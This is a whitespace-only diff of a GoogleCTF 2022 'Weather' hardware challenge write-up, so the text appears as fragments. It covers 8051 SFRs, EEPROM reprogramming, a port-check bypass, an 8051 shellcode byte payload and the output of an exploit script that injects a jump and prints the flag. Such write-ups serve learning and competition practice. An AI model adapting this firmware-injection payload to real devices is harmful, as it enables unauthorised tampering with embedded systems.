@@ -1,7 +1,7 @@
 
 # GoogleCTF 2022 - Hardware - Weather writeup
-This challenge is what I consider a good learning experience, 
-and a perfect model for how hardware challenges should be like. 
+This challenge is what I consider a good learning experience,
+and a perfect model for how hardware challenges should be like.
 It was really interesting not only in terms of the problems you needed to
 solve to get the flag, but also in terms of the additional
 research you needed to do to get a clear picture of how the system works
@@ -21,20 +21,20 @@ once again.
 ## Remote connection
 If the servers of the challenge are still running, then you can connect to them at `weather.2022.ctfcompetition.com 1337`.
 
-Otherwise you would need to compile them from 
-[sources](https://github.com/google/google-ctf/tree/master/2022/hardware-weather/challenge), 
-I haven't tried doing it, but it should be simple since they provide 
-a Dockerfile. Keep in mind that you aren't allowed to look at the 
+Otherwise you would need to compile them from
+[sources](https://github.com/google/google-ctf/tree/master/2022/hardware-weather/challenge),
+I haven't tried doing it, but it should be simple since they provide
+a Dockerfile. Keep in mind that you aren't allowed to look at the
 sources before solving the challenge.
 
 ## Prerequesite knowledge
-The line separating *Prerequisite knowledge* and *Stuff to search for* 
+The line separating *Prerequisite knowledge* and *Stuff to search for*
 is arbitrary, and in fact it can be argued that they are the same thing,
 but in this writeup I will be drawing that line based on what I already knew
 before this challenge.
 
 ### SFRs — Special Function Registers
-For microcontrollers, it is very common to have special registers 
+For microcontrollers, it is very common to have special registers
 that exhibit special behaviour when read or written to, or control the
 microcontroller itself. These registers are (usually) accessed through RAM
 addresses, and so the same instructions to modify any memory byte applies
@@ -75,7 +75,7 @@ All the sensors and the EEPROM are connected with the microcontroller
 through the I2C bus.
 
 By googling [8051], we can find that there is a processor with that name,
-this could be useful if, say *cough* for a reason, we needed 
+this could be useful if, say *cough* for a reason, we needed
 to reprogram the device *cough*, and just in general to have a
 better understanding of the components in the system.
 
@@ -94,12 +94,12 @@ The datasheet also describes in detail how to interact with the different device
 * Pinging I2C devices.
 
 Also, quoting from the datasheet:
-> In a typical application CTF-55930B serves as firmware storage for 
+> In a typical application CTF-55930B serves as firmware storage for
 > CTF-8051 microcontroller via the SPI(PMEM) bus.
 
 So the EEPROM stores the program code, in addition, the datasheet describes
 the protocol to clear bits from the EEPROM(setting bits is impossible
-without physical access to the device), effectivly explaining how 
+without physical access to the device), effectivly explaining how
 to reprogram the EEPROM with some constraints. This definitely could be used
 to exploit the system.
 
@@ -131,7 +131,7 @@ __sfr __at(0xfe) POWERSAVE;
 It contains a declaration for all the SFR ports described in the datasheet,
 in addition to `POWEROFF` and `POWERSAVE`, which were left undocumented.
 
-Anyway, as the law of reverse engineering dictates, we must start 
+Anyway, as the law of reverse engineering dictates, we must start
 reading the source code from the main function, I would recommand taking
 a look at the function, but tl;dr: it continously checks for user commands
 received via the serial input and handles them.
@@ -148,7 +148,7 @@ well, it seems easy now that we have the `w` command, no?
 Well, there are two problems.
 
 ### Port verification
-The original function of the entire system is to report different 
+The original function of the entire system is to report different
 atmospherical data, and so the developpers limited reading and writing to
 I2C to sensor ports through the function `bool is_port_allowed(char*)`.
 
@@ -184,7 +184,7 @@ bool is_port_allowed(const char *port) {
   return false;
 }
 ```
-When the port is validated, the string is passed to 
+When the port is validated, the string is passed to
 `uint8_t str_to_uint8(const char* s)` to be converted to an unsigned 8-bit
 integer.
 ```c
@@ -378,7 +378,7 @@ payload = [
   0x02, 0x0C, 0x03,
   0xE5, 0xF3,
   0x60, 0xFC,
-  0x75, 0xF2, 0x0A, 
+  0x75, 0xF2, 0x0A,
   0x80, 0xFE
 ]
 ```
@@ -399,19 +399,19 @@ Executing the exploit gives us:
 $ python exploit.py
 [+] Opening connection to weather.2022.ctfcompetition.com on port 1337: Done
 Delivering payload
-w 101153 69 48 165 90 165 90 138 17 255 122 16 13 250 17 26 17 159 252 253 243 252 26 12 159 3 138 13 245 127 1 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 
-w 101153 1 48 
+w 101153 69 48 165 90 165 90 138 17 255 122 16 13 250 17 26 17 159 252 253 243 252 26 12 159 3 138 13 245 127 1 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255 255
+w 101153 1 48
 Page 48
-75 ee 00 85 ef f2 05 ee 
-e5 ee 60 03 02 0c 03 e5 
-f3 60 fc 75 f2 0a 80 fe 
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00 
+75 ee 00 85 ef f2 05 ee
+e5 ee 60 03 02 0c 03 e5
+f3 60 fc 75 f2 0a 80 fe
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
 Injecting jump at page 4 to 0xC00
-w 101153 69 4 165 90 165 90 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 255 253 243 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
+w 101153 69 4 165 90 165 90 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 255 253 243 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
 waiting for response...
 b'CTF{DoesAnyoneEvenReadFlagsAnymore?}\n'
 [*] Closed connection to weather.2022.ctfcompetition.com port 1337
